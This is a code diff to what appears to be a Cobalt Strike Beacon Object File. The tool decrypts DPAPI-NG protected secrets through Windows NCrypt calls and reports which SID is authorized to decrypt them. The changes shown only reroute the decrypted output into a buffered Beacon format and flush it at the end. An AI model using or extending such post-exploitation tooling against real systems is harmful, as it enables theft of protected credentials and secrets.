@@ -303,12 +303,19 @@ extern "C" {
         BOOL isFinal
         ) {
 
-        BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Output: %ls", pbData);
+        formatp* b = (formatp*) pvCallbackCtxt;
+        BeaconFormatPrintf(b, "Decrypting secret...\n");
+        BeaconFormatPrintf(b, "Decrypted Output: %ls", pbData);
 
         return 0;
     }
 
     bool unprotectSecret(BYTE* protectedData, ULONG protectedDataLength) {
+
+        formatp fBeaconOut;
+        PSTR pBeaconFlush = NULL;
+        INT intBeaconOutBufSize = 0;
+        BeaconFormatAlloc(&fBeaconOut, 250);
 
         BYTE* secData = NULL;
         ULONG secDataLength = 0;
@@ -326,9 +333,7 @@ extern "C" {
         NCRYPT_DESCRIPTOR_HANDLE unprotectHandle;
 
         streamInfo.pfnStreamOutput = decryptCallback;
-        streamInfo.pvCallbackCtxt = NULL;
-
-        BeaconPrintf(CALLBACK_OUTPUT, "Decrypting secret...\n");
+        streamInfo.pvCallbackCtxt = (void*) &fBeaconOut;
 
         NCRYPT_STREAM_HANDLE streamHandle2;
         void* actualSidString = nullptr;
@@ -343,9 +348,9 @@ extern "C" {
         }
 
         if (error = NCryptGetProtectionDescriptorInfo(unprotectHandle, NULL, 1, sidString) == 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "Authorized SID Decryptor(s): %ls\n", (WCHAR*)(*sidString));
+            BeaconFormatPrintf(&fBeaconOut, "Authorized SID Decryptor(s): %ls\n", (WCHAR*)(*sidString));
             sSidString = RemoveSIDPrefix((WCHAR*) *sidString);
-            BeaconPrintf(CALLBACK_OUTPUT, "\t SID NT Account Name: %ls\n", ConvertSIDToNTAccount(sSidString));
+            BeaconFormatPrintf(&fBeaconOut, "\t SID NT Account Name: %ls\n", ConvertSIDToNTAccount(sSidString));
         }
         else {
             BeaconPrintf(CALLBACK_ERROR, "NCryptGetProtectionDescriptorInfo failed with error: %x\n", error);
@@ -358,15 +363,15 @@ extern "C" {
         }
 
         if ((error = NCryptStreamUpdate(streamHandle, protectedData + 16, protectedDataLength - 16, true)) != 0) {
-
             NCryptStreamClose(streamHandle);
-
             BeaconPrintf(CALLBACK_ERROR, "NCryptStreamUpdate error: %x\n", error);
             return false;
         }
 
+        pBeaconFlush = BeaconFormatToString(&fBeaconOut, &intBeaconOutBufSize);
+        BeaconOutput(CALLBACK_OUTPUT, pBeaconFlush, intBeaconOutBufSize);
+        BeaconFormatFree(&fBeaconOut);
         NCryptStreamClose(streamHandle);
-
         return true;
     }
 
